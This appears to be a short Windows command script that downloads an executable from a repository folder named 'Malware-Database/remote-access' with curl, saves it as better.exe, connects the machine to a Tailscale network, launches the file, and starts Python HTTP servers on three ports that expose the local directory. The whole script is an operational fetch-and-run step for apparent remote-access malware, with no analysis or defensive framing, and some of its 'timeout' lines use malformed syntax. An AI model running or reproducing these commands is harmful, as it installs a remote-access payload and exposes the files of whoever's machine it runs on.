curl https://gitea.com/cvmuser1000/Malware-Database/raw/branch/main/remote-access/skyhighsundaerat.exe --output better.exe
timeout -c 20
"C:/Program Files/Tailscale/tailscale.exe" up
start better.exe
py -m http.server 5151
timeout -c 9999
py -m http.server 5000
py -m http.server 5651
